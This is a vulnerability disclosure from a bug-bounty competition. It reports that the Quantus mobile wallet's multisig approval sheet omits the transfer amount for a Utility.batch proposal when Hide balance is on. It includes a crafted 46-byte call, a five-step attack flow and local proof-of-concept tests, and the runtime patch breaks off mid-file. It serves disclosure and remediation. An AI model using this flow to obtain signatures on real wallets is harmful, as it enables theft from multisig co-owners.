# 88274 w a medium with hide balance enabled a utility batch multisig proposal shows no transfer amount anywhere on the approval sheet while the same transfer unwrapped still shows it

**Submitted on Aug 12th 2026 at 14:53:28 UTC by @skydev for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88274
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Brief/Intro

In the frozen Quantus mobile application, the multisig approval sheet shows the exact amount of a direct `Balances.transfer_allow_death` proposal even when **Hide balance** is enabled. Wrapping the same transfer in a one-item `Utility.batch` removes the amount from that sheet entirely: no headline figure, and the nested amount renders as `-----`. Destination, call and the enabled **Approve** control remain.

The cause is one function. `Utility.batch` is the only call wrapper in the decoder that does not carry its inner call's `TransferSummary` upward; six siblings — including two in the same `_utility` switch — do. A co-signer therefore supplies the second signature of a threshold multisig without the amount ever appearing on the screen that requests it, and the authentic stored call then moves that amount out of the multisig account.

## Vulnerability Details

### One wrapper in its class drops the summary

`DecodedCall` carries an optional `TransferSummary`. When present, the approval sheet renders it as a headline with the amount. Every wrapper that dispatches its inner call under the signer's own origin lifts that summary through — except one:

| Wrapper                                           | `call_decoder.dart` | carries `summary` |
| ------------------------------------------------- | ------------------- | ----------------- |
| `Multisig` (two arms)                             | `:337`, `:352`      | yes               |
| `Utility.as_derivative`                           | `:555`              | yes               |
| `Utility.with_weight`                             | `:570`              | yes               |
| `Utility.if_else`                                 | `:580`              | yes               |
| `Utility.dispatch_as`                             | `:607`              | yes               |
| `Recovery`                                        | `:619`              | yes               |
| **`Utility.batch` / `batch_all` / `force_batch`** | **`:587-595`**      | **no**            |

`as_derivative` and `with_weight` sit in the same `switch` as `batch`, eleven and eighteen lines away, and both pass `summary: inner.summary`. `batch` is the only member of that class that does not.

Two further sites build a `NestedCallField` without a summary — `_boundedProposalField` (`:884-887`, reached from `Referenda.submit`) and `_preimageBytesField` (`:910-912`, from `Preimage.note_preimage`, whose own note reads *"Noted for later dispatch by a referendum"*). Neither dispatches under the signer's origin: both queue bytes for governance to dispatch later, so neither is in the class above. They inherit the same rendering gap.

The project's own test suite records the expectation. In one group in `quantus_sdk/test/chain/call_decoder_test.dart`, `test('recovery.as_recovered lifts the wrapped transfer summary')` at `:277-287` asserts `expect(decoded.summary?.amount, oneToken)`, while `test('utility.batch_all expands every inner call')` at `:261-275` asserts the call name, the child count and both child call names, and never mentions the summary. No test anywhere asserts that a batch has no summary.

The file that renders the result documents the intent (`decoded_call_view.dart:11-14`): *"Multisig proposals are not always transfers — governance votes, runtime upgrade authorisations and batches all arrive through the same pallet — so a transfer-shaped layout silently misreports them. This shows the call the runtime actually declared, with each of its parameters."* Batches are named there as a proposal shape the sheet must render correctly.

Two merged pull requests state the same rule. Commit `2293f20` (*"fix: multisig approve must carry the proposal's inner call"*, [#585](https://github.com/Quantus-Network/quantus-apps/pull/585)) gives the goal as lifting *"a nested transfer's amount into the hero position"*. [#586](https://github.com/Quantus-Network/quantus-apps/pull/586), merged 2026-07-27 and titled *"cold wallet decodes every chain call, no blind signing"*, states it directly:

> **Amount hero** comes from the call's transfer summary, which propagates up from a nested call — a multisig approve of a transfer still reads as an amount and a recipient, while a governance vote names the call instead of claiming zero.

The summary propagating up from a nested call is the behaviour `_batch` does not implement.

### What each branch produces

<details open>

<summary>The two branches, verbatim from <code>quantus_sdk/lib/src/chain/call_decoder.dart</code></summary>

```dart
  static DecodedCall _transfer(String pallet, String name, multi_address.MultiAddress dest, BigInt amount) {
    return DecodedCall(
      pallet: pallet,
      call: name,
      fields: [_addressField('Destination', dest), AmountField('Amount', amount)],
      summary: TransferSummary(amount: amount, recipient: _plainAccount(dest)),
    );
  }

  static DecodedCall _batch(String name, List<runtime.RuntimeCall> calls) {
    return DecodedCall(
      pallet: 'Utility',
      call: name,
      fields: [
        ValueField('Calls', '${calls.length}', kind: ValueKind.number),
        for (var i = 0; i < calls.length; i++) NestedCallField('Call ${i + 1}', describe(calls[i])),
      ],
    );
  }
```

</details>

The batch children are decoded correctly — the amount survives strict decoding as an `AmountField`. What does not survive is the summary, and the summary is what the sheet's headline is built from.

### The nested amount is routed through the passive balance-hiding provider

`DecodedCallView` renders a native `AmountField` with `txAmountDisplayProvider`. That provider watches `isBalanceHiddenProvider` and replaces both token and fiat representations with the hidden placeholder. By contrast, the direct-transfer headline receives `NumberFormattingService` directly and remains exact.

<details open>

<summary>Privacy-aware nested amount rendering</summary>

```dart
case AmountField(:final label, :final token, :final assetId, :final note):
  final value = assetId == null
      ? ref.watch(txAmountDisplayProvider)(token, isSend: true).primaryAmount
      : '$token (asset #$assetId, raw units)';

// ...

if (isHidden) {
  data = data.copyWith(
    primaryAmount: hiddenText,
    secondaryAmount: hiddenText,
  );
}
```

</details>

`DecodedCallHeadline.of` takes an injected formatter, and the three call sites differ:

| Surface                                                                    | formatter                 | direct transfer, Hide balance on | one-item batch                                       |
| -------------------------------------------------------------------------- | ------------------------- | -------------------------------- | ---------------------------------------------------- |
| Approval sheet headline (`multisig_action_confirm_sheet.dart:295`, `:354`) | `fmt.formatBalance`       | **exact amount**                 | no amount — the headline falls back to the call name |
| `AmountField` detail row (`decoded_call_view.dart:66-68`)                  | `txAmountDisplayProvider` | `-----`                          | `-----`                                              |
| Proposal list tile (`proposal_list_tile.dart:43`)                          | `formatAmount`            | `-----`                          | `-----`                                              |

So under Hide balance a direct transfer still states its amount once, in the headline of the screen that asks for the signature. A batch states it nowhere. The sheet has no per-field reveal; the only way to see the figure is to leave the flow and turn the global setting off from the home screen.

### The final approval control does not treat an omitted amount as incomplete review data

The approval sheet disables confirmation while submitting, while authoritative bytes are loading, or after those bytes fail to load. It does not disable confirmation when a value-moving field is hidden. After local authentication it forwards the already-loaded authoritative bytes to the submit callback.

<details open>

<summary>Confirmation remains enabled and forwards the authoritative bytes</summary>

```dart
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;

// ...

QuantusButton.simple(
  label: widget.labels.confirmLabel(l10n),
  isDisabled: blocked,
  onTap: blocked ? null : _confirm,
);

// ...

final authed = await LocalAuthService().authenticate(...);
if (authed) {
  await widget.submit(ref, signer, _networkFee, _callBytes);
}
```

</details>

This report does not rely on modified RPC or indexer data. The proposal bytes are authentic, strict decoding recovers the correct amount, and the approval path forwards the same bytes. The defect occurs after those protections succeed, when the review renderer suppresses the amount.

### Where the proposal comes from

Neither scoped asset builds a batch proposal: the app's propose path calls `proposeTransfer` (`multisig_propose_strategy.dart:213`), which reaches the SDK's `MultisigService.propose` (`multisig_service.dart:384-392`); that in turn builds its call with `buildProposeTransferCall` (`:341`, `:391`), which wraps a plain transfer. The proposal in this report is encoded outside the application.

The runtime accepts that. `Multisig::propose` (`pallets/multisig/src/lib.rs:535-540`) takes any encoded `RuntimeCall` from any registered signer, and the approval renderer was written for exactly this case — `decoded_call_view.dart:11-14` names batches among the proposal shapes that "arrive through the same pallet" and must therefore be rendered correctly rather than assumed to be transfers.

### A normal multisig threshold makes the omitted field economically consequential

The frozen runtime requires the approver to be a registered signer and to resubmit bytes equal to the stored proposal. The proposing signer already contributes approval one. When a second signer approves the same bytes, the proposal becomes `Approved`; any registered signer may then execute it. Execution decodes the stored call and dispatches it with the multisig account as the signed origin.

The PoC uses one fixed 46-byte SCALE call in both repositories:

```
090004020000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb0f40cef630448203
```

The frozen app decodes this as:

```
Utility.batch([
  Balances.transfer_allow_death(
    MultiAddress::Id(AccountId32([0xbb; 32])),
    987654321000000
  )
])
```

The widget regression shows that the exact amount — `987654321000000` base units, 987.654321 tokens — is decoded but not shown, that the rendered **Approve** control can be activated, and that the sheet forwards those exact bytes once. The frozen-runtime regression shows that the same bytes remain stored through an ordinary 2-of-2 approval and that execution increases the encoded destination balance by exactly `987654321000000`.

This is not a signature or threshold bypass. It is a final-review defect: the second signature is real, but one of the principal transaction parameters is not shown at the moment that signature is requested.

### Expected and observed behavior

**Expected:** Every amount and destination that can move value from a multisig remains visible at the final approval step, or confirmation remains disabled until the user explicitly reveals those fields.

**Observed:** A one-item batch hides its correctly decoded amount behind the portfolio privacy placeholder while keeping confirmation enabled. Removing only the batch wrapper makes the same amount visible under the same privacy setting.

### Affected frozen sources

* Mobile application and SDK: `d5fc4d6572ebc2244e95009a33f5da5048935867`
* Supporting chain: `3b243b870a5442a6e5f443056f67bbba87d472f5`
* Scoped asset: `https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app`
* The affected decoder is supplied by the separately listed `quantus_sdk` asset at the same frozen commit.

### Remediation

`_batch` should carry the summary of its children, as `as_derivative`, `with_weight`, `if_else`, `dispatch_as` and the two `Multisig` arms already do. A batch can hold several transfers, so a single-child summary is not sufficient — every nested value-moving amount and destination needs to reach the sheet.

The same omission is present elsewhere in the decoder and is worth checking in the same pass: in `_balances`, `force_unreserve`, `force_set_balance`, `force_adjust_total_issuance` and `burn` each emit a native `AmountField` with no `TransferSummary` (`call_decoder.dart:106-131`). The first three require a Root origin; `burn` is `ensure_signed` (`pallets/balances/src/lib.rs:881-886`).

## Impact Details

**Impact: Websites and Applications — Critical — "Direct theft of user funds".**

The published Critical list for this asset type contains a separate entry for actions taken *"on behalf of other users **without any interaction by that user**"*. That interaction condition is written into that entry and is absent from "Direct theft of user funds", so the presence of a victim action does not by itself move this finding out of the theft entry.

The funds outcome here needs no second defect and no further step. One `Balances.transfer_allow_death` is dispatched with the multisig account as the signed origin (`pallets/multisig/src/lib.rs:1156-1157`), the destination is chosen by the proposer, and the balance delta is asserted exactly in the runtime test. Nothing is displayed incorrectly at any point — the amount is simply not displayed, on the one screen whose purpose is to obtain authorization for it.

If the classification is read differently, the same demonstrated behaviour also falls under the Critical entry *"Malicious interactions with an already-connected wallet, such as: … Submitting malicious transactions"*. Both are listed on the submission.

### The flow

An ordinary 2-of-2 or 2-of-3 multisig, threshold at least 2:

{% stepper %}
{% step %}

## Submit a one-transfer batch proposal

A registered signer encodes a one-transfer batch outside the application and submits it through `Multisig::propose`. Proposing supplies approval one.
{% endstep %}

{% step %}

## Open the approval sheet

A second registered signer, with Hide balance enabled, opens the normal approval sheet.
{% endstep %}

{% step %}

## Review the proposal

The sheet loads the correct stored bytes and shows the batch, the transfer call and the destination. The amount appears nowhere on the sheet.
{% endstep %}

{% step %}

## Approve the proposal

The second signer completes the prompted approval, including local biometric authentication.
{% endstep %}

{% step %}

## Execute the transfer

The threshold is met and any registered signer executes; the runtime transfers the encoded amount from the multisig account.
{% endstep %}
{% endstepper %}

The amount is bounded only by the multisig's balance. The PoC uses `987654321000000` base units — **987.654321 tokens** at the chain's 12 decimals — and asserts that exact delta on the destination.

### Conditions and bounds

* Hide balance is opt-in and off by default (`settings_service.dart:387`). The attack requires the second signer to have enabled it.
* The attacker must already be a registered signer of that multisig, and below the threshold alone. This is a position the victim granted deliberately; it is not access to the project's own systems or infrastructure.
* The second signer performs a real, locally authenticated approval. No signature or threshold check is bypassed, and no silent signing is claimed.
* Destination and wrapper stay visible. A signer who declines every unfamiliar destination is unaffected.
* At threshold 1 the finding does not apply, because no second approval is solicited.
* A multisig configured with the runtime's high-security policy is not reachable by this exact shape: the gate at `pallets/multisig/src/lib.rs:620`, re-checked at `:1142`, admits only the calls listed in `runtime/src/configs/mod.rs:683-693` — three `ReversibleTransfers` calls and `Vesting::claim`. `Utility.batch` is not among them. Ordinary multisigs, which the application creates by default, are reachable.
* The proposal must remain valid and the transfer affordable at execution.
* Proposing is not free: `Multisig::propose` charges a non-refundable fee scaled by signer count and reserves a deposit until the proposal is resolved.

The report claims neither control of a wallet nor a runtime authorization failure. It claims that the scoped application omits the amount at the moment it asks a signer to authorize it, and that the omission is specific to one decoder branch.

The public M3 remediation addressed a different stage: it made approval load and bind authoritative call bytes instead of trusting indexer presentation. This report begins after that protection has succeeded — the bytes are authentic, decoding is correct, and the omission happens in rendering.

## References

* [Direct Balances transfer decoding and `TransferSummary`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L82-L146)
* [Utility batch decoding without a summary](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L538-L595)
* [Recursive `AmountField` rendering](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/components/decoded_call_view.dart#L66-L119)
* [Headline rendering from `TransferSummary`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/components/decoded_call_view.dart#L145-L166)
* [Balance-privacy provider](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/providers/currency_display_provider.dart#L283-L382)
* [Final multisig confirmation and submit path](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart#L249-L288)
* [Final multisig review rendering and enabled-state logic](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart#L345-L408)
* [`Multisig::propose` accepts any encoded RuntimeCall](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L535-L560)
* [`_batch` — the one wrapper without a summary](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L587-L595)
* [Sibling wrappers that carry the summary](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L550-L620)
* [The project's own test: `as_recovered` lifts the summary, `batch_all` asserts fields only](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/test/chain/call_decoder_test.dart#L260-L287)
* [High-security whitelist contents](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L683-L693)
* [Hide balance defaults to off](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/settings_service.dart#L386-L388)
* [PR #586 — "Amount hero comes from the call's transfer summary, which propagates up from a nested call"](https://github.com/Quantus-Network/quantus-apps/pull/586)
* [PR #585 — "multisig approve must carry the proposal's inner call"](https://github.com/Quantus-Network/quantus-apps/pull/585)
* [Runtime execution as the multisig account](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L1042-L1166)

## Link to Proof of Concept

<https://gist.github.com/Skydev0h/f5404b2b44029d378825917708a7200d>

## Proof of Concept

This PoC has two local layers joined by one fixed SCALE byte vector. The first exercises the frozen production decoder and final approval widget. The second applies the same bytes to the frozen runtime's ordinary 2-of-2 multisig lifecycle and verifies the exact balance effect. Neither test contacts a node, RPC endpoint, indexer, device, live account, or project service.

### Artifacts

The three reproduction files are in this unlisted Gist:

<https://gist.github.com/Skydev0h/f5404b2b44029d378825917708a7200d>

| File                    | Purpose                                             |
| ----------------------- | --------------------------------------------------- |
| `poc_test.dart`         | Frozen application widget regression                |
| `runtime-harness.patch` | Directly applicable frozen-chain test patch         |
| `runtime_test.rs`       | Standalone copy of the Rust test added by the patch |

Both tests use this exact 46-byte call:

```
090004020000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb0f40cef630448203
```

It represents:

```
Utility.batch([
  Balances.transfer_allow_death(
    MultiAddress::Id(AccountId32([0xbb; 32])),
    987654321000000
  )
])
```

### Step 1: reproduce the final approval behavior

A Flutter SDK compatible with the frozen project is required. From a clean directory:

A Flutter SDK is required; the repository does not vendor one. Verified on Flutter 3.44.9 stable, which satisfies the `sdk: ">=3.8.0 <4.0.0"` constraint in `mobile-app/pubspec.yaml`. The Rust step below needs only a Rust toolchain and the repository's normal native build dependencies.

```sh
git clone https://github.com/immunefi-team/audit-comp-quantus-apps c74-app
cd c74-app
git -c advice.detachedHead=false checkout d5fc4d6572ebc2244e95009a33f5da5048935867

git clone https://gist.github.com/Skydev0h/f5404b2b44029d378825917708a7200d c74-poc
cp c74-poc/poc_test.dart mobile-app/test/unit/multisig_hidden_batch_amount_regression_test.dart

cd mobile-app
flutter pub get
flutter test --no-pub --no-test-assets test/unit/multisig_hidden_batch_amount_regression_test.dart --reporter expanded
```

Expected output:

```
00:00 +0: stored batch amount is hidden while the exact bytes remain approvable
00:00 +1: All tests passed!
```

The widget test performs the following checks:

{% stepper %}
{% step %}

## Verify the encoded batch

The generated `Utility.batch` encodes to the fixed 46-byte vector.
{% endstep %}

{% step %}

## Decode the transfer

Strict production decoding recovers the nested transfer, destination, and exact amount.
{% endstep %}

{% step %}

## Verify the hidden amount

With Hide balance enabled, the batch amount renders as `-----`.
{% endstep %}

{% step %}

## Verify approval remains enabled

The rendered **Approve** control is enabled and is actually activated with `tester.tap`.
{% endstep %}

{% step %}

## Verify authoritative bytes are submitted

The sheet invokes `submit` exactly once with byte-for-byte identical authoritative bytes.
{% endstep %}

{% step %}

## Re-decode submitted bytes

Re-decoding the callback bytes returns the same nested transfer and amount.
{% endstep %}

{% step %}

## Disable privacy

With privacy disabled, the same batch displays the exact amount.
{% endstep %}

{% step %}

## Compare a direct transfer

With privacy enabled, the same direct transfer retains an exact amount headline, showing the difference is wrapper-dependent.
{% endstep %}
{% endstepper %}

The submit callback is injected and inert: this layer stops at the production UI-to-submission boundary and does not sign or broadcast anything. The widget test also satisfies the local-authentication gate trivially, so it demonstrates the rendering and the enabled control, not the biometric step.

### Step 2: reproduce the frozen runtime semantics

A Rust toolchain and the repository's normal native build dependencies are required. From a clean directory:

```sh
git clone https://github.com/immunefi-team/audit-comp-quantus-chain c74-chain
cd c74-chain
git -c advice.detachedHead=false checkout 3b243b870a5442a6e5f443056f67bbba87d472f5

git clone https://gist.github.com/Skydev0h/f5404b2b44029d378825917708a7200d c74-poc
git apply c74-poc/runtime-harness.patch

SKIP_WASM_BUILD=1 cargo test -p quantus-runtime --test mod governance::c74_multisig_amount::tests::exact_hidden_batch_bytes_reach_threshold_and_move_the_encoded_amount -- --exact --nocapture
```

Expected output:

```
running 1 test
test governance::c74_multisig_amount::tests::exact_hidden_batch_bytes_reach_threshold_and_move_the_encoded_amount ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 42 filtered out
```

The runtime test shows that the same fixed bytes:

{% stepper %}
{% step %}

## Decode and round-trip the call

Decode under the frozen `RuntimeCall` with no trailing data and round-trip unchanged.
{% endstep %}

{% step %}

## Verify the batch contents

Describe exactly one `Utility.batch` child: `Balances.transfer_allow_death` to `AccountId32([0xbb; 32])` for `987654321000000` base units (987.654321 tokens at 12 decimals).
{% endstep %}

{% step %}

## Store the proposal

Store the bytes unchanged in an ordinary 2-of-2 multisig proposal.
{% endstep %}

{% step %}

## Verify initial proposal status

Leave the proposal `Active` after the proposing signer's first approval.
{% endstep %}

{% step %}

## Approve the proposal

Move the proposal to `Approved` after the second registered signer confirms the same bytes.
{% endstep %}

{% step %}

## Execute the transfer

Increase the encoded destination balance by exactly `987654321000000` base units (987.654321 tokens) when the approved proposal is executed.
{% endstep %}

{% step %}

## Remove the completed proposal

Remove the completed proposal from storage.
{% endstep %}
{% endstepper %}

This layer uses local `TestExternalities` and direct signed origins. It does not start a node or use private keys.

### Observed result

Both layers passed on the exact frozen commits listed above. The fixed byte vector is independently decoded by the SDK and runtime. Together the tests connect the final review state—correct destination, hidden amount, enabled and activated approval—to the deterministic balance movement represented by the same bytes.

### Attached source files

<details>

<summary><code>poc_test.dart</code></summary>

```dart
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/generated/planck/pallets/balances.dart' as balances_pallet;
import 'package:quantus_sdk/generated/planck/pallets/utility.dart' as utility_pallet;
import 'package:quantus_sdk/generated/planck/types/sp_runtime/multiaddress/multi_address.dart' as multi_address;
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:resonance_network_wallet/providers/currency_display_provider.dart';
import 'package:resonance_network_wallet/providers/l10n_provider.dart';
import 'package:resonance_network_wallet/providers/wallet_providers.dart';
import 'package:resonance_network_wallet/services/exchange_rate_service.dart';
import 'package:resonance_network_wallet/v2/components/decoded_call_view.dart';
import 'package:resonance_network_wallet/v2/components/quantus_button.dart';
import 'package:resonance_network_wallet/v2/screens/multisig/multisig_action_confirm_sheet.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../extensions.dart';
import '../fakes.dart';

final _destination = multi_address.MultiAddress.values.id(List<int>.filled(32, 0xBB));
final _amount = BigInt.parse('987654321000000');
const _batchCallHex = '090004020000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb0f40cef630448203';

List<int> _decodeHex(String value) => [
  for (var index = 0; index < value.length; index += 2) int.parse(value.substring(index, index + 2), radix: 16),
];

RuntimeCall _transfer() => const balances_pallet.Txs().transferAllowDeath(dest: _destination, value: _amount);

RuntimeCall _batchTransfer() => const utility_pallet.Txs().batch(calls: [_transfer()]);

MultisigProposal _proposal(RuntimeCall call) => MultisigProposal(
  entityId: 'proposal-c74',
  id: 74,
  multisigAddress: 'multisig-c74',
  proposer: 'signer-a',
  createdAt: DateTime.utc(2026, 8, 12),
  updatedAt: DateTime.utc(2026, 8, 12),
  pallet: 'Utility',
  call: 'batch',
  recipient: '',
  amount: BigInt.zero,
  callRaw: call.encode(),
  expiryBlock: 1000,
  approvals: const ['signer-a'],
  deposit: BigInt.zero,
  status: MultisigProposalStatus.active,
  threshold: 2,
  signerCount: 2,
);

MultisigAccount _multisig(Account signer) => MultisigAccount(
  name: 'C74 fixture',
  accountId: 'multisig-c74',
  signers: ['signer-a', signer.accountId],
  threshold: 2,
  nonce: BigInt.one,
  myMemberAccountId: signer.accountId,
);

class _FixtureBalanceHiddenNotifier extends IsBalanceHiddenNotifier {
  _FixtureBalanceHiddenNotifier(bool value) : super(SettingsService()) {
    state = value;
  }

  @override
  Future<void> setIsBalanceHidden(bool value) async {
    state = value;
  }
}

Future<ProviderContainer> _pumpApproval(
  WidgetTester tester, {
  required RuntimeCall call,
  required bool balanceHidden,
  required void Function(List<int>?) onFeeInput,
  required void Function(List<int>?) onSubmitInput,
}) async {
  final signer = makeAccount(2);
  final callBytes = call.encode();

  await tester.pumpApp(
    Scaffold(
      body: Builder(
        builder: (context) => Theme(
          // A real tap would otherwise request Flutter's ink-sparkle shader,
          // which is intentionally unavailable under --no-test-assets.
          data: Theme.of(context).copyWith(splashFactory: NoSplash.splashFactory),
          child: MultisigActionConfirmSheet(
            msig: _multisig(signer),
            proposal: _proposal(call),
            signer: signer,
            labels: MultisigConfirmSheetLabels(
              title: (_) => 'Review proposal',
              body: (_) => 'Review the stored call',
              confirmLabel: (_) => 'Approve fixture',
              dismissLabel: (_) => 'Dismiss fixture',
              authReason: (_) => 'Fixture authentication',
              failedMessage: (_) => 'Fixture failed',
            ),
            loadCallBytes: (_) async => callBytes,
            estimateFee: (_, _, loadedBytes) async {
              onFeeInput(loadedBytes);
              return BigInt.zero;
            },
            submit: (_, _, _, submittedBytes) async => onSubmitInput(submittedBytes),
            buildCall: (_, _) => call,
            submitExternal:
                (_, {required signer, required unsignedData, required signature, required publicKey, fee}) async {
                  return 'unused';
                },
            logPrefix: '[C74Regression]',
            hardwareTelemetryPrefix: 'c74_regression',
            hardwareCacheIdentity: 'c74-regression',
          ),
        ),
      ),
    ),
    overrides: [
      exchangeRateServiceProvider.overrideWithValue(ExchangeRateService(rates: const {})),
      isBalanceHiddenProvider.overrideWith((_) => _FixtureBalanceHiddenNotifier(balanceHidden)),
    ],
  );
  await tester.pumpAndSettle();

  return ProviderScope.containerOf(tester.element(find.byType(MultisigActionConfirmSheet)));
}

void _expectConfirmEnabled(WidgetTester tester) {
  final confirm = find.ancestor(of: find.text('Approve fixture'), matching: find.byType(QuantusButton));
  expect(confirm, findsOneWidget);

  final button = tester.widget<QuantusButton>(confirm);
  expect(button.isDisabled, isFalse);
  expect(button.onTap, isNotNull);

  final inkWell = find.descendant(of: confirm, matching: find.byType(InkWell));
  expect(tester.widget<InkWell>(inkWell).onTap, isNotNull);
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  setUpAll(() async {
    SharedPreferences.setMockInitialValues({});
    await SettingsService().initialize();
  });

  testWidgets('stored batch amount is hidden while the exact bytes remain approvable', (tester) async {
    final batch = _batchTransfer();
    final bytes = batch.encode();
    expect(bytes, orderedEquals(_decodeHex(_batchCallHex)));
    final decoded = CallDecoder.decodeBytes(bytes);
    final child = decoded.fields.whereType<NestedCallField>().single.call;

    // Authentic generated RuntimeCall bytes reach the same strict decoder used
    // by the approval sheet; no hand-built DecodedCall fixture is involved.
    expect(decoded.pallet, 'Utility');
    expect(decoded.call, 'batch');
    expect(decoded.summary, isNull);
    expect(child.call, 'transfer_allow_death');
    expect(child.fields.whereType<AmountField>().single.token, _amount);
    final destination = child.fields.whereType<ValueField>().firstWhere((field) => field.label == 'Destination').value;

    List<int>? feeInput;
    List<int>? submitInput;
    var submitCount = 0;
    final hiddenContainer = await _pumpApproval(
      tester,
      call: batch,
      balanceHidden: true,
      onFeeInput: (bytes) => feeInput = bytes,
      onSubmitInput: (bytes) {
        submitCount += 1;
        submitInput = bytes;
      },
    );

    // The successful storage-load path is complete and the exact bytes are
    // passed onward, yet the only rendered nested amount is the placeholder.
    expect(feeInput, orderedEquals(bytes));
    expect(hiddenContainer.read(isBalanceHiddenProvider), isTrue);
    expect(hiddenContainer.read(txAmountDisplayProvider)(_amount, isSend: true).primaryAmount, '-----');
    expect(find.text('-----'), findsOneWidget);
    expect(find.text(destination), findsOneWidget);
    _expectConfirmEnabled(tester);

    // Activate the production confirmation control. The sheet's software
    // approval boundary receives the authoritative bytes loaded above, not a
    // reconstructed call or the indexer's summary fields.
    await tester.tap(find.text('Approve fixture'));
    await tester.pumpAndSettle();
    expect(submitCount, 1);
    expect(submitInput, isNotNull);
    expect(submitInput, orderedEquals(bytes));

    final submitted = CallDecoder.decodeBytes(submitInput!);
    final submittedChild = submitted.fields.whereType<NestedCallField>().single.call;
    expect(submitted.pallet, 'Utility');
    expect(submitted.call, 'batch');
    expect(submittedChild.call, 'transfer_allow_death');
    expect(submittedChild.fields.whereType<AmountField>().single.token, _amount);
    expect(find.byType(MultisigActionConfirmSheet), findsNothing);

    // Negative control 1: the same batch and bytes disclose the nested amount
    // when the passive-balance privacy setting is off.
    await tester.pumpWidget(const SizedBox.shrink());
    await tester.pumpAndSettle();
    final visibleContainer = await _pumpApproval(
      tester,
      call: batch,
      balanceHidden: false,
      onFeeInput: (_) {},
      onSubmitInput: (_) {},
    );
    final visibleAmount = visibleContainer.read(txAmountDisplayProvider)(_amount, isSend: true).primaryAmount;
    expect(visibleAmount, isNot('-----'));
    expect(find.text(visibleAmount), findsOneWidget);
    expect(find.text('-----'), findsNothing);
    _expectConfirmEnabled(tester);

    // Negative control 2: privacy still hides the duplicate AmountField for a
    // direct transfer, but its TransferSummary keeps an exact headline visible.
    await tester.pumpWidget(const SizedBox.shrink());
    await tester.pumpAndSettle();
    final direct = _transfer();
    final directContainer = await _pumpApproval(
      tester,
      call: direct,
      balanceHidden: true,
      onFeeInput: (_) {},
      onSubmitInput: (_) {},
    );
    final directDecoded = CallDecoder.decodeBytes(direct.encode());
    final headline = DecodedCallHeadline.of(
      directDecoded,
      amountText: (token) {
        final l10n = directContainer.read(l10nProvider);
        final fmt = directContainer.read(numberFormattingServiceProvider);
        return l10n.commonAmountBalance(
          fmt.formatBalance(token, smartDecimals: AppConstants.decimals),
          AppConstants.tokenSymbol,
        );
      },
    );
    expect(directDecoded.summary?.amount, _amount);
    expect(headline.primary, isNot('-----'));
    expect(find.text(headline.primary), findsOneWidget);
    expect(find.text('-----'), findsOneWidget);
    _expectConfirmEnabled(tester);
  });
}
```

</details>

<details>

<summary><code>runtime-harness.patch</code></summary>

```diff
diff --git a/runtime/tests/governance/mod.rs b/runtime/tests/governance/mod.rs
index 35b42ba3..af963819 100644
--- a/runtime/tests/governance/mod.rs
+++ b/runtime/tests/governance/mod.rs
@@ -1,3 +1,4 @@
+pub mod c74_multisig_amount;
 pub mod tech_collective;
 pub mod treasury;
 pub mod vesting;
diff --git a/runtime/tests/governance/c74_multisig_amount.rs b/runtime/tests/governance/c74_multisig_amount.rs
new file mode 100644
index 00000000..c06837e3
--- /dev/null
+++ b/runtime/tests/governance/c74_multisig_amount.rs
@@ -0,0 +1,110 @@
+//! Local C74 integration fixture.
+//!
+//! The byte string below is also asserted by the frozen Flutter widget test.
+//! This runtime-side layer proves what those exact, correctly decoded bytes do
+//! after an ordinary 2-of-2 multisig reaches its configured threshold.
+
